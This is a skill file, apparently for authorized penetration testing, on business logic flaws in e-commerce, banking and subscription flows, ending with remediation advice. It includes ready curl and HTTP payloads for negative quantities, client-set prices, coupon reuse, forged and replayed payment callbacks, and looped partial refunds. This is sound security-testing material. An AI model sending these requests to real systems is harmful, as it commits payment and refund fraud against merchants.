---
name: business-logic
description: Systematically probe business logic vulnerabilities including price and quantity manipulation negative amounts coupon stacking workflow step skipping payment callback forgery order state abuse refund fraud and client-trust violations across e-commerce banking and subscription flows.
---

# Business Logic Vulnerability Testing

## When to use this skill

Use this skill during authorized engagements against e-commerce checkouts, banking transfers, subscription billing, referral programs, or any workflow where the server enforces rules about money, quantity, sequence, or entitlement. Business logic flaws are invisible to scanners because each defect is a unique gap between what developers implemented and what they assumed. Model the intended behavior first, then violate every assumption one at a time. Test only systems you are explicitly authorized to assess, using accounts you own and control.

## Methodology

### 1. Methodology Mindset: Map Flows, Enumerate States, Define the Oracle

Reconstruct the intended logic as a state machine before attacking anything. For checkout: `cart -> address -> payment -> confirmation -> fulfillment`. For refunds: `delivered -> requested -> approved -> funds_returned`. For each transition ask two questions: does the server *enforce* this transition, or does it merely *expect* it? What does the server trust the client to have already done?

Enumerate every client-controlled field along the way. Then define your impact oracle — the observable signal that proves real impact: a changed order total, a granted entitlement, a moved balance, a shipment created without payment. Capture a clean baseline of every legitimately reachable state so each test becomes a diffable yes/no question.

```bash
# Baseline the canonical happy path before mutating anything
curl -s -b "session=VALID" https://target.com/api/orders/8841 \
  | jq '{status, total, currency, items, payment_state}'
```

### 2. Price and Quantity Manipulation Catalog

Totals are recalculated somewhere. If that somewhere is the client or a trusting endpoint, every price is a suggestion. Test each vector independently: negative quantities that credit the cart, zero or near-zero totals that survive only UI-level checks, quantity values that overflow integer types, client-submitted unit prices, currency switching mid-order to exploit conversion rounding, and rounding abuse where per-line rounding differs from cart-level rounding.

```http
POST /api/cart/items HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=VALID

{"sku":"SKU-001","quantity":-2}
```

```bash
# Client-supplied unit price and integer overflow on quantity
curl -s -X POST https://target.com/api/cart/items \
  -H "Content-Type: application/json" -b "session=VALID" \
  -d '{"sku":"SKU-001","quantity":1,"unit_price":0.01}'
curl -s -X POST https://target.com/api/cart/items \
  -H "Content-Type: application/json" -b "session=VALID" \
  -d '{"sku":"SKU-001","quantity":99999999999999}'
# Currency switch after pricing but before capture
curl -s -X PATCH https://target.com/api/orders/8841 \
  -H "Content-Type: application/json" -b "session=VALID" \
  -d '{"currency":"IDR"}'
```

### 3. Coupon and Discount Abuse

Discount engines fail in predictable ways. Stack codes by applying them sequentially when validity is only checked per-request. Reuse single-use codes by removing and re-adding them or replaying the apply call. Per-user limits usually bind on account lookup only — assume they hold across email variants you control. Gift cards loop when refunds are issued back onto the same instrument used for payment.

```bash
# Stacking: apply two codes in sequence and watch the total
curl -s -X POST https://target.com/api/cart/coupons \
  -H "Content-Type: application/json" -b "session=VALID" -d '{"code":"SAVE10"}'
curl -s -X POST https://target.com/api/cart/coupons \
  -H "Content-Type: application/json" -b "session=VALID" -d '{"code":"WELCOME15"}'
# Reuse after removal (single-use enforcement often lives only in the UI)
curl -s -X DELETE https://target.com/api/cart/coupons/SAVE10 -b "session=VALID"
curl -s -X POST https://target.com/api/cart/coupons \
  -H "Content-Type: application/json" -b "session=VALID" -d '{"code":"SAVE10"}'
```

### 4. Workflow Bypass and Order State Abuse

Long workflows accumulate unenforced steps. Call late-stage endpoints directly: confirm an order that was never paid, replay a confirmation endpoint to duplicate fulfillment, issue API calls out of order, cancel or refund after delivery, and request partial refunds repeatedly until cumulative refunds exceed the original charge. State names sent by the client (`status`, `state`, `stage`) are hints to the server, not facts.

```http
POST /api/orders/8841/confirm HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=VALID

{"payment_state":"paid"}
```

```bash
# Repeated partial refunds against an already-delivered order
for i in 1 2 3 4 5; do
  curl -s -X POST https://target.com/api/orders/8841/refund \
    -H "Content-Type: application/json" -b "session=VALID" \
    -d '{"amount":25.00,"reason":"partial"}'
done
```

### 5. Payment Integrity: Redirects, Callbacks, Currency

Payment flows cross a trust boundary at the gateway redirect and again at the callback. If the amount is embedded in redirect parameters, tamper it between pricing and handoff. If the success callback lacks signature validation or accepts unsigned parameters, forge completion directly. Currency fields on both sides of the gateway must agree; a downgrade on one side converts units silently.

```http
POST /payment/callback HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

order_id=8841&status=success&amount=0.01&currency=USD&txn_id=FORGED-1
```

```bash
# Inspect the gateway handoff captured from the redirect form
curl -s https://target.com/api/payments/initiate \
  -b "session=VALID" -d "order_id=8841" | grep -Eo 'amount=[^&"]+'
# Replay a captured success callback with a fresh txn_id to double-credit
curl -s -X POST https://target.com/payment/callback \
  -d "order_id=8841&status=success&amount=199.00&currency=USD&txn_id=REAL-1-replay"
```

### 6. Account Flows: Bonuses, Referrals, Trials

Growth incentives are business logic too. Signup bonuses, referral credits, and trial extensions assume one human equals one account. Test only with accounts you own and control: register alias variants under your own addresses, apply your own referral code to your own second account, and observe whether limits bind on device fingerprint, payment instrument, verified identity, or nothing at all. Never target other users' accounts or generate volume against real users.

```bash
# Second account under your control applying your own referral code
curl -s -X POST https://target.com/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"you+alt2@yourdomain.test","password":"C0rrect-Horse-1","referral":"YOUR-CODE"}'
# Trial reset attempt using another identifier you own
curl -s -X POST https://target.com/api/trials/start \
  -H "Content-Type: application/json" \
  -d '{"email":"you+trial3@yourdomain.test","plan":"pro"}'
```

### 7. Client-Trust Violations

Any decision made in the browser is a suggestion to the server. Entitlement gates implemented only in JavaScript, role flags in localStorage, feature flags fetched from config endpoints, and totals computed client-side all collapse under direct API access. Read the bundle for hidden endpoints and parameters, then call those endpoints as an unprivileged user.

```javascript
// Observed in the bundle: gate exists only client-side
localStorage.setItem("user_role", "premium");
localStorage.setItem("entitlements", JSON.stringify(["pro_features"]));
```

```bash
# The server must decide — call the gated endpoint directly with no flags set
curl -s https://target.com/api/reports/export?format=pdf -b "session=FREE_TIER"
# Submit a client-computed total to see whether the server trusts it
curl -s -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" -b "session=VALID" \
  -d '{"items":[{"sku":"SKU-001","qty":1}],"total":0.00}'
```

### Remediation

- Compute all prices, totals, taxes, and discounts server-side from authoritative catalogs; never accept amounts, unit prices, negative quantities, or currencies from the client.
- Enforce every workflow transition server-side with an explicit state machine; reject out-of-order, repeated, or skipped steps.
- Require idempotency keys on payment, refund, and confirmation endpoints; cap cumulative refunds against the original charge amount.
- Validate payment callbacks with HMAC signatures over the full parameter set plus a timestamp; reject replays and stale nonces.
- Bind coupons, gift cards, bonuses, and trials to identity, device, and payment-instrument signals; enforce per-user limits atomically.
- Make all authorization and entitlement decisions server-side; treat client state as untrusted display data only.
- Log state-transition anomalies (negative quantities, impossible sequences, refund excess) and alert on them; add regression tests for every logic flaw found.
